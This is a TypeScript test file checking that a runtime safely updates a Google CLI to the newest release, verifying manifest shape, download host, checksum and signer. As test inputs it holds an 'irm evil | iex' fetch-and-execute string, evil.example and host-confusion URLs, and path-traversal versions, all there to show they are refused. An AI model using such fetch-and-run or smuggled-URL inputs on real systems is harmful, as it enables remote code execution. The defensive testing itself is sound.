import { createHash } from "node:crypto";
import { existsSync, mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { afterEach, beforeEach, describe, expect, it } from "vitest";
import {
  DOWNLOAD_COMMAND, INSTALLABLE_CLIS, LATEST_UNAUDITED, MANIFEST_COMMAND, installManagedCli, isLatestCli, managedCliExecutable, managedInstaller, parseLatestManifest, signerMatches,
  updateManagedCliToLatest, type InstallDeps,
} from "../src/runtime-cli-install.js";
import { runtimeFacts, runtimeIds } from "../src/cli-registry.js";

// AGEND-153 (the maintainer's decision on #3539): on a paired Windows computer, Antigravity's Update is the one named exception — it goes to the newest release Google's own manifest names.
// What these tests show is what the Runtime reads, accepts and checks, in which order, and what it refuses; the vendor's bytes were measured on 2026-11-10 (the manifest, the size, the
// signer) and are in docs/dev/cli-registry.md. A fake PowerShell stands in for `Invoke-WebRequest`, as in runtime-cli-install.test.ts.
const real = INSTALLABLE_CLIS.antigravity, sha = (b: Buffer): string => createHash("sha512").update(b).digest("hex");
const GOOGLE = 'CN=Google LLC, O=Google LLC, L=Mountain View, S=California, C=US';
const URL_OF = (version: string, build = "6604829099950080"): string => `https://storage.googleapis.com/antigravity-public/antigravity-cli/${version}-${build}/windows-x64/cli_windows_x64.exe`;
const body16 = Buffer.from("MZ-agy-1.6.0-fixture"), body153 = Buffer.from("MZ-agy-1.5.3-fixture");
const manifestOf = (version: string, content: Buffer, over: Record<string, unknown> = {}): string => JSON.stringify({ version, url: URL_OF(version), sha512: sha(content), ...over });

let home: string;
beforeEach(() => { home = mkdtempSync(join(tmpdir(), "agend-latest-153-")); });
afterEach(() => rmSync(home, { recursive: true, force: true }));

interface Call { kind: "manifest" | "download" | "other"; env: NodeJS.ProcessEnv; args: string[] }
/** A fake PowerShell: answers the manifest read with `manifest`, saves `content` where the download is told to put it. */
function fake(options: { manifest?: string; manifestCode?: number | null; content?: Buffer; downloadCode?: number } = {}): { run: NonNullable<InstallDeps["run"]>; calls: Call[] } {
  const calls: Call[] = [];
  return { calls, run: async (_file, args, { env }) => {
    const text = args[args.length - 1];
    const kind = text === MANIFEST_COMMAND ? "manifest" : text === DOWNLOAD_COMMAND ? "download" : "other";
    calls.push({ kind, env, args });
    if (kind === "manifest") return { code: options.manifestCode === undefined ? 0 : options.manifestCode, stdout: `${options.manifest ?? ""}\r\n` };
    if (kind === "download") {
      if (options.downloadCode) return { code: options.downloadCode, stdout: "" };
      writeFileSync(env.AGEND_DOWNLOAD_FILE!, options.content ?? body16); return { code: 0, stdout: "" };
    }
    return { code: 1, stdout: "" };
  } };
}
const smallPin = { ...real, bytes: body153.length, sha512: sha(body153) };
const deps = (over: Partial<InstallDeps> = {}): InstallDeps => ({ root: join(home, "cli"), nodePath: join(home, "nowhere", "node.exe"), pins: { antigravity: smallPin }, signerOf: async () => ({ status: "Valid", subject: GOOGLE }), ...over });
/** The computer already has the pinned 1.5.3 (what an Install put there). */
async function withPinned(): Promise<void> {
  await installManagedCli("antigravity", deps({ run: fake({ content: body153 }).run }));
  expect(managedCliExecutable(join(home, "cli"), "antigravity")).toMatchObject({ version: "1.5.3" });
}

describe("what the vendor's manifest may say", () => {
  it("the real manifest (read 2026-11-10) is accepted, and gives the version, the address and the checksum, lower-cased", () => {
    const text = JSON.stringify({ version: "1.5.3", url: real.url, sha512: real.sha512 });
    expect(parseLatestManifest("antigravity", text)).toEqual({ version: "1.5.3", url: real.url, sha512: real.sha512 });
    expect(parseLatestManifest("antigravity", text.replace(real.sha512, real.sha512.toUpperCase()))?.sha512).toBe(real.sha512);
    // a field the vendor adds later is ignored, never used
    expect(parseLatestManifest("antigravity", JSON.stringify({ version: "1.5.3", url: real.url, sha512: real.sha512, extra: "x", command: "irm evil | iex" }))).toEqual({ version: "1.5.3", url: real.url, sha512: real.sha512 });
  });
  it.each([
    ["another host", { url: "https://evil.example/antigravity-public/antigravity-cli/1.6.0-1/windows-x64/cli_windows_x64.exe" }],
    ["http", { url: URL_OF("1.6.0").replace("https", "http") }],
    ["userinfo that makes the host another", { url: URL_OF("1.6.0").replace("https://", "https://storage.googleapis.com@evil.example/") }],
    ["a query string", { url: `${URL_OF("1.6.0")}?x=1` }],
    ["a path climbing out", { url: URL_OF("1.6.0").replace("/windows-x64/", "/../windows-x64/") }],
    ["another file name", { url: URL_OF("1.6.0").replace("cli_windows_x64.exe", "install.ps1") }],
    ["another platform", { url: URL_OF("1.6.0").replace("windows-x64", "windows-arm64") }],
    ["an address for another version than the one it says", { url: URL_OF("1.5.9") }],
    ["a version that is not three numbers", { version: "1.6" }],
    ["a prerelease version", { version: "1.6.0-beta" }],
    ["a checksum that is not 128 hex digits", { sha512: "abc" }],
    ["a checksum that is not hex", { sha512: "z".repeat(128) }],
    ["a number for a version", { version: 160 }],
  ])("refuses %s", (_name, over) => {
    expect(parseLatestManifest("antigravity", JSON.stringify({ version: "1.6.0", url: URL_OF("1.6.0"), sha512: "a".repeat(128), ...over }))).toBeNull();
  });
  it.each(["", "not json", "[]", "null", "42", '"x"', "{}"])("refuses %j", text => { expect(parseLatestManifest("antigravity", text)).toBeNull(); });
});

describe("the table and the registry agree", () => {
  it("the CLIs the Runtime takes to the latest are exactly the registry's `runtime.update` of kind latest-unaudited — and each one is a pinned download with a Google-signed file", () => {
    const registry = runtimeIds("update").filter(id => runtimeFacts(id, "update")?.kind === "latest-unaudited");
    expect(Object.keys(LATEST_UNAUDITED).sort()).toEqual(registry.sort());
    expect(registry).toEqual(["antigravity"]);
    for (const id of registry) expect(INSTALLABLE_CLIS[id as keyof typeof INSTALLABLE_CLIS].kind).toBe("download");
    expect(LATEST_UNAUDITED.antigravity.manifest).toMatch(/^https:\/\/[a-z0-9.-]+\/manifests\/windows_amd64\.json$/);
    expect(LATEST_UNAUDITED.antigravity.file.test(real.url)).toBe(true);        // the pinned file is itself of the shape the exception accepts
    expect(isLatestCli("antigravity")).toBe(true);
    for (const id of ["codex", "claude-code", "opencode", "grok", "__proto__", "constructor", 7]) expect(isLatestCli(id), String(id)).toBe(false);
  });
});

describe("Update to the vendor's latest (the named exception)", () => {
  it("reads the manifest from its fixed address, downloads that file, checks size, sha512 and the signer, and switches to it: 1.5.3 → 1.6.0, the old folder pruned", async () => {
    await withPinned();
    const { run, calls } = fake({ manifest: manifestOf("1.6.0", body16) }), steps: string[] = [];
    const result = await updateManagedCliToLatest("antigravity", deps({ run, report: s => steps.push(s) }));
    expect(result).toMatchObject({ version: "1.6.0" });
    expect(calls.map(c => c.kind)).toEqual(["manifest", "download"]);
    // the address of each read comes from the table / the checked manifest, travels in the environment, and the command text is the fixed one
    expect(calls[0].env.AGEND_DOWNLOAD_URL).toBe(LATEST_UNAUDITED.antigravity.manifest);
    expect(calls[1].env.AGEND_DOWNLOAD_URL).toBe(URL_OF("1.6.0"));
    expect(calls[1].env.AGEND_DOWNLOAD_FILE).toBe(join(home, "cli", "antigravity", "1.6.0.staging", "agy.exe"));
    expect(calls[0].args).toEqual(["-NoProfile", "-NonInteractive", "-Command", MANIFEST_COMMAND]);
    expect(steps).toEqual(expect.arrayContaining(["installing", "checking-integrity", "checking-publisher", "ready"]));
    expect(JSON.parse(readFileSync(join(home, "cli", "antigravity", "current.json"), "utf8"))).toEqual({ version: "1.6.0" });
    expect(readFileSync(join(home, "cli", "antigravity", "1.6.0", "agy.exe"))).toEqual(body16);
    expect(existsSync(join(home, "cli", "antigravity", "1.5.3"))).toBe(false);
    // a copy NEWER than this Runtime's pin is the one in use
    expect(managedCliExecutable(join(home, "cli"), "antigravity")).toMatchObject({ version: "1.6.0", command: join(home, "cli", "antigravity", "1.6.0", "agy.exe") });
  });
  it("the vendor's own updater is never run: every program started is PowerShell's fixed read or the fixed download", async () => {
    await withPinned();
    const { run, calls } = fake({ manifest: manifestOf("1.6.0", body16) });
    await updateManagedCliToLatest("antigravity", deps({ run }));
    expect(calls.every(c => c.kind === "manifest" || c.kind === "download")).toBe(true);
    expect(calls.flatMap(c => c.args).join(" ")).not.toMatch(/agy|update|install\.ps1/i);
  });
  it("a file whose checksum is not the manifest's is refused, and the copy the computer had is exactly as it was", async () => {
    await withPinned();
    const { run } = fake({ manifest: manifestOf("1.6.0", body16), content: Buffer.from("MZ-something-else") });
    await expect(updateManagedCliToLatest("antigravity", deps({ run }))).rejects.toMatchObject({ reason: "integrity-mismatch", message: expect.stringContaining("checksum") });
    expect(managedCliExecutable(join(home, "cli"), "antigravity")).toMatchObject({ version: "1.5.3" });
    expect(existsSync(join(home, "cli", "antigravity", "1.6.0.staging"))).toBe(false);
    expect(existsSync(join(home, "cli", "antigravity", "1.6.0"))).toBe(false);
  });
  it("a file that someone other than Google signed, or whose signature is not Valid, is refused: nothing is switched", async () => {
    await withPinned();
    for (const answer of [{ status: "Valid", subject: "CN=Someone Else, O=Someone Else" }, { status: "NotSigned", subject: "" }, { status: "HashMismatch", subject: GOOGLE }, { status: "Error", subject: "" }]) {
      const { run } = fake({ manifest: manifestOf("1.6.0", body16) });
      await expect(updateManagedCliToLatest("antigravity", deps({ run, signerOf: async () => answer })), answer.status).rejects.toMatchObject({ reason: "publisher-mismatch" });
    }
    expect(managedCliExecutable(join(home, "cli"), "antigravity")).toMatchObject({ version: "1.5.3" });
    expect(existsSync(join(home, "cli", "antigravity", "1.6.0"))).toBe(false);
    expect(signerMatches(GOOGLE, real.native.signer)).toBe(true);
  });
  it("an empty file is refused (the manifest names no size, so there is a ceiling and a floor, not an exact size)", async () => {
    await withPinned();
    await expect(updateManagedCliToLatest("antigravity", deps({ run: fake({ manifest: manifestOf("1.6.0", Buffer.alloc(0)), content: Buffer.alloc(0) }).run }))).rejects.toMatchObject({ reason: "integrity-mismatch" });
    expect(managedCliExecutable(join(home, "cli"), "antigravity")).toMatchObject({ version: "1.5.3" });
  });
  it.each([
    ["the manifest could not be read", { manifest: "", manifestCode: 1 }, /could not be read/],
    ["the read timed out", { manifest: "", manifestCode: null }, /in time/],
    ["the manifest is not the expected shape", { manifest: "<html>sign in</html>" }, /not what this AgEnD version expects/],
    ["the manifest names a file at another address", { manifest: manifestOf("1.6.0", body16, { url: "https://evil.example/agy.exe" }) }, /not what this AgEnD version expects/],
  ])("%s: refused before anything is downloaded or written", async (_name, options, message) => {
    const { run, calls } = fake(options as never);
    await expect(updateManagedCliToLatest("antigravity", deps({ run }))).rejects.toThrow(message);
    expect(calls.map(c => c.kind)).toEqual(["manifest"]);
    expect(existsSync(join(home, "cli", "antigravity"))).toBe(false);
  });
  it("a download that fails leaves the old copy and a clear message", async () => {
    await withPinned();
    await expect(updateManagedCliToLatest("antigravity", deps({ run: fake({ manifest: manifestOf("1.6.0", body16), downloadCode: 1 }).run }))).rejects.toMatchObject({ reason: "install-failed", message: expect.stringContaining("download could not be completed") });
    expect(managedCliExecutable(join(home, "cli"), "antigravity")).toMatchObject({ version: "1.5.3" });
  });
  it("the computer already has that release, or a newer one: nothing is downloaded and the copy stays", async () => {
    await withPinned();
    const up = fake({ manifest: manifestOf("1.6.0", body16) });
    await updateManagedCliToLatest("antigravity", deps({ run: up.run }));
    const same = fake({ manifest: manifestOf("1.6.0", body16) });
    expect(await updateManagedCliToLatest("antigravity", deps({ run: same.run }))).toMatchObject({ version: "1.6.0" });
    expect(same.calls.map(c => c.kind)).toEqual(["manifest"]);
    const older = fake({ manifest: manifestOf("1.5.9", body153) });
    expect(await updateManagedCliToLatest("antigravity", deps({ run: older.run }))).toMatchObject({ version: "1.6.0" });
    expect(older.calls.map(c => c.kind)).toEqual(["manifest"]);
    expect(managedCliExecutable(join(home, "cli"), "antigravity")).toMatchObject({ version: "1.6.0" });
  });
  it("an Install after an Update never takes the copy back to the pin: it is 'already installed' (no download)", async () => {
    await withPinned();
    await updateManagedCliToLatest("antigravity", deps({ run: fake({ manifest: manifestOf("1.6.0", body16) }).run }));
    const again = fake({ content: body153 });
    expect(await installManagedCli("antigravity", deps({ run: again.run }))).toMatchObject({ version: "1.6.0" });
    expect(again.calls).toEqual([]);
    const installer = managedInstaller({ root: join(home, "cli"), nodePath: join(home, "nowhere", "node.exe"), pins: { antigravity: smallPin }, run: again.run });
    expect(installer.installed("antigravity")).toBe(true);
    expect(installer.knowsLatest("antigravity")).toBe(true); expect(installer.knowsLatest("codex")).toBe(false);
  });
  it("only a CLI of the exception can be updated this way: Codex, Claude Code and OpenCode have the pinned install, and an id that is not a CLI has nothing", async () => {
    for (const id of ["codex", "claude-code", "opencode", "grok", "__proto__", 7]) {
      const { run, calls } = fake({ manifest: manifestOf("1.6.0", body16) });
      await expect(updateManagedCliToLatest(id, deps({ run })), String(id)).rejects.toMatchObject({ reason: "install-failed", message: expect.stringContaining("not updated to a latest release") });
      expect(calls).toEqual([]);
    }
    // and the install function itself never takes a release for a CLI that is not in the exception
    await expect(installManagedCli("codex", deps(), { version: "9.9.9", url: URL_OF("9.9.9"), sha512: "a".repeat(128) })).rejects.toMatchObject({ message: expect.stringContaining("not updated to a latest release") });
  });
  it("the Runtime's live admission is asked before the manifest is read, and a refusal stops it there", async () => {
    const { run, calls } = fake({ manifest: manifestOf("1.6.0", body16) });
    const refusal = new Error("switch turned off");
    await expect(updateManagedCliToLatest("antigravity", deps({ run, gate: () => { throw refusal; } }))).rejects.toBe(refusal);
    expect(calls).toEqual([]);
  });
  it("a Runtime that is stopping cancels it", async () => {
    const stop = new AbortController(); stop.abort();
    const { run, calls } = fake({ manifest: manifestOf("1.6.0", body16) });
    await expect(updateManagedCliToLatest("antigravity", deps({ run, signal: stop.signal }))).rejects.toMatchObject({ reason: "cancelled" });
    expect(calls).toEqual([]);
  });
  it("a pointer that is not three plain numbers is never followed (it would become a folder name)", () => {
    const root = join(home, "cli"); mkdirSync(join(root, "antigravity"), { recursive: true });
    for (const version of ["../x", "1.6.0.old", "1.6", "9.9.9\\..", "1.4.0"]) {
      writeFileSync(join(root, "antigravity", "current.json"), JSON.stringify({ version }));
      expect(managedCliExecutable(root, "antigravity"), version).toBeNull();
    }
  });
});
